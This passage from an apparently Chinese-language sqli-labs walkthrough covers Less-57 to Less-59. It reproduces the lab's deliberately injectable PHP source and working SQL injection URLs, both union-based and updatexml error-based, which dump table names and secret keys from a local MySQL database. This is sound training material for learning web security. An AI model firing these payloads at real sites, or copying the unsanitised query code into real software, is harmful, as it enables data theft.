class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=index.php"</span> );</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>要求还是没变，在指定的次数获取key，根据代码给出payload，这个作者在把$id带入sql查询之前偷偷加了个”，滴滴，抓起来锤<br><img src="https://s2.ax1x.com/2019/02/17/ksvb0e.png" alt="ksvb0e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-57/index.php?id=0%22%20union%20select%201,2,3%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-57/index.php?id=0%22%20union%20select%201,database(),3%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-57/index.php?id=0%22%20union%20select%201,table_name,3%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-57/index.php?id=0%22%20union%20select%201,(select%20`3`%20from%20(select%201,2,3,4%20union%20select%20*%20from%205tblzh9088)a%20limit%201,1),3%20--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/17/ksvxpt.md.png" alt="ksvxpt.md.png"></p><p><b>58关</b><br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-58</span>:Challenge<span class="number">-5</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style =<span class="string">"text-align:right"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input  type=<span class="string">"submit"</span> name=<span class="string">"reset"</span> value=<span class="string">"Reset the Challenge!"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/right&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:20px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/sql-connect-1.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/functions.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$pag = $_SERVER[<span class="string">'PHP_SELF'</span>]; <span class="comment">//generating page address to piggy back after redirects...</span></span><br><span class="line">$characters = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>; <span class="comment">//characterset for generating random data</span></span><br><span class="line">$times= <span class="number">5</span>;</span><br><span class="line">$table = table_name();</span><br><span class="line">$col = column_name(<span class="number">1</span>);     <span class="comment">// session id column name</span></span><br><span class="line">$col1 = column_name(<span class="number">2</span>);   <span class="comment">//secret key column name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Submitting the final answer</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'answer_key'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// resetting the challenge and repopulating the table .</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to main challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="comment">//echo "cookie expired";</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Checking the cookie on the page and populate the table with random value.</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'challenge'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line"><span class="comment">//echo "Cookie value: ".$sessid;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">$hash = data($table,$col);</span><br><span class="line">setcookie(<span class="string">"challenge"</span>, $hash, $expire);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//update the counter in database</span></span><br><span class="line">next_tryy();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Display attempts on screen.</span></span><br><span class="line">$tryyy = view_attempts();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You have made : "</span>. $tryyy .<span class="string">" of $times attempts"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Reset the Database if you exceed allowed attempts.</span></span><br><span class="line"><span class="keyword">if</span>($tryyy &gt;= ($times+<span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;</span><br><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = array_reverse($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;"</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-58.jpg"</span> /&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div  style=<span class="string">" color:#00FFFF; font-size:18px; text-align:center"</span>&gt;</span><br><span class="line">&lt;form name=<span class="string">"input"</span> action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">Submit Secret Key: &lt;input type=<span class="string">"text"</span> name=<span class="string">"key"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name = <span class="string">"answer_key"</span> value=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div  style=" color:#00FFFF; font-size:18px; text-align:center"&gt;'</span>;</span><br><span class="line">$key = addslashes($_POST[<span class="string">'key'</span>]);</span><br><span class="line">$key = mysql_real_escape_string($key);</span><br><span class="line"><span class="comment">//echo $key;</span></span><br><span class="line"><span class="comment">//Query table to verify your result</span></span><br><span class="line">$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br><span class="line"><span class="comment">//echo "$sql";</span></span><br><span class="line">$result=mysql_query($sql)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error in submittion of Key Solution"</span>.mysql_error());</span><br><span class="line"> </span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-54-1.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>; </span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=index.php"</span> );</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>要求如是循环，这里不在重复，只是次数减少成了5次，无法正常回显结果，但是代码输出了mysql报错可以用报错注入根据代码给出payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-58/index.php?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-58/index.php?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22challenges%22),0x7e),1)%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-58/index.php?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20`2`%20from%20(select%201,2,3,4%20union%20select%20*%20from%20zejpphddnv)a%20limit%201,1),0x7e),1)%20--+</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/17/ksz0MV.png" alt="ksz0MV.png"></p><p><b>59关</b><br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-59</span>:Challenge<span class="number">-6</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style =<span class="string">"text-align:right"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input  type=<span class="string">"submit"</span> name=<span class="string">"reset"</span> value=<span class="string">"Reset the Challenge!"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/right&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:20px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/sql-connect-1.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/functions.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$pag = $_SERVER[<span class="string">'PHP_SELF'</span>]; <span class="comment">//generating page address to piggy back after redirects...</span></span><br><span class="line">$characters = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>; <span class="comment">//characterset for generating random data</span></span><br><span class="line">$times= <span class="number">5</span>;</span><br><span class="line">$table = table_name();</span><br><span class="line">$col = column_name(<span class="number">1</span>);     <span class="comment">// session id column name</span></span><br><span class="line">$col1 = column_name(<span class="number">2</span>);   <span class="comment">//secret key column name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Submitting the final answer</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'answer_key'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// resetting the challenge and repopulating the table .</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to main challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="comment">//echo "cookie expired";</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Checking the cookie on the page and populate the table with random value.</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'challenge'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line"><span class="comment">//echo "Cookie value: ".$sessid;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">$hash = data($table,$col);</span><br><span class="line">setcookie(<span class="string">"challenge"</span>, $hash, $expire);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//update the counter in database</span></span><br><span class="line">next_tryy();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Display attempts on screen.</span></span><br><span class="line">$tryyy = view_attempts();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You have made : "</span>. $tryyy .<span class="string">" of $times attempts"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Reset the Database if you exceed allowed attempts.</span></span><br><span 